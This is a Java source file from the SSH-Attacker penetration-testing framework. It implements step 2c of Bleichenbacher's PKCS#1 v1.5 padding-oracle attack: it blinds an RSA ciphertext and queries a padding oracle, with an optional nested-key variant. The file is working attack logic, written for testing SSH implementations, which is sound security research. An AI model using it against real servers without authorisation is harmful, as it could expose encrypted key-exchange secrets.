/*
 * SSH-Attacker - A Modular Penetration Testing Framework for SSH
 *
 * Copyright 2014-2024 Ruhr University Bochum, Paderborn University, and Hackmanit GmbH
 *
 * Licensed under Apache License 2.0 http://www.apache.org/licenses/LICENSE-2.0
 */
package de.rub.nds.sshattacker.attacks.pkcs1;

import de.rub.nds.modifiablevariable.util.ArrayConverter;
import de.rub.nds.sshattacker.attacks.pkcs1.oracles.Pkcs1Oracle;
import de.rub.nds.sshattacker.attacks.pkcs1.util.MathHelper;
import de.rub.nds.sshattacker.core.crypto.keys.CustomRsaPublicKey;
import java.math.BigInteger;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.util.concurrent.Callable;
import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;

public class Step2cRunner extends Pkcs1Attack implements Callable {
    BigInteger two_B;
    BigInteger three_B;
    BigInteger big_two = BigInteger.TWO;
    BigInteger lowerBound;
    BigInteger upperBound;
    BigInteger previousS;

    CustomRsaPublicKey rsaPublicKey;
    CustomRsaPublicKey outerKey;
    byte[] ciphertext;

    public Step2cRunner(
            byte[] msg,
            Pkcs1Oracle pkcsOracle,
            BigInteger twoB,
            BigInteger threeB,
            BigInteger lowerBound,
            BigInteger upperBound,
            BigInteger previousS,
            CustomRsaPublicKey rsaPublicKey,
            CustomRsaPublicKey outerKey) {
        super(msg, pkcsOracle);
        this.two_B = twoB;
        this.three_B = threeB;
        this.lowerBound = lowerBound;
        this.upperBound = upperBound;
        this.previousS = previousS;
        this.ciphertext = msg;
        this.rsaPublicKey = rsaPublicKey;
        this.outerKey = outerKey;
    }

    private BigInteger manipulateCiphertext(BigInteger s, BigInteger e, BigInteger n, byte[] c) {
        BigInteger exponentiated = s.modPow(e, n);
        BigInteger cipher = new BigInteger(1, c);
        BigInteger res = cipher.multiply(exponentiated);

        return res.mod(n);
    }

    private BigInteger step2c(
            BigInteger lowerBound,
            BigInteger upperBound,
            BigInteger previousS,
            byte[] ciphertext,
            CustomRsaPublicKey rsaPublicKey,
            CustomRsaPublicKey outerKey) {

        boolean oracleResult;
        //  ri = ceil(2 * (b * prev_s - 2 * B), n)
        BigInteger bTimesPrevs = upperBound.multiply(previousS);
        BigInteger bTimePrevsSubTwoB = bTimesPrevs.subtract(two_B);
        BigInteger ri =
                MathHelper.ceil(big_two.multiply(bTimePrevsSubTwoB), rsaPublicKey.getModulus());

        while (true) {

            // si_lower = ceil(2 * B + ri * n, b)
            // si_upper = ceil(3 * B + ri * n, a)
            BigInteger rITimesN = ri.multiply(rsaPublicKey.getModulus());
            BigInteger si_lower = MathHelper.ceil(two_B.add(rITimesN), upperBound);
            BigInteger si_upper = MathHelper.ceil(three_B.add(rITimesN), lowerBound);

            for (BigInteger si = si_lower;
                    si.compareTo(si_upper) < 0;
                    si = si.add(BigInteger.ONE)) {

                BigInteger attempt =
                        manipulateCiphertext(
                                si,
                                rsaPublicKey.getPublicExponent(),
                                rsaPublicKey.getModulus(),
                                ciphertext);

                if (outerKey != null) {
                    BigInteger encryptedAttempt = encryptBigInt(attempt, outerKey);
                    oracleResult = queryOracle(encryptedAttempt, true);
                    // counterInnerBleichenbacher++;
                } else {
                    oracleResult = queryOracle(attempt, false);
                    // counterOuterBleichenbacher++;
                }

                if (oracleResult) {
                    return si;
                }
            }

            ri = ri.add(BigInteger.ONE);
        }
    }

    private BigInteger encryptBigInt(BigInteger attempt, CustomRsaPublicKey encryptionKey) {
        try {
            Cipher javaCipher = Cipher.getInstance("RSA/ECB/PKCS1Padding");

            javaCipher.init(Cipher.ENCRYPT_MODE, encryptionKey);

            return new BigInteger(
                    javaCipher.doFinal(ArrayConverter.bigIntegerToByteArray(attempt)));

        } catch (InvalidKeyException
                | IllegalBlockSizeException
                | BadPaddingException
                | NoSuchPaddingException
                | NoSuchAlgorithmException e) {
            throw new RuntimeException(e);
        }
    }

    @Override
    public BigInteger call() throws Exception {
        return step2c(
                this.lowerBound,
                this.upperBound,
                this.previousS,
                this.ciphertext,
                this.rsaPublicKey,
                this.outerKey);
    }
}
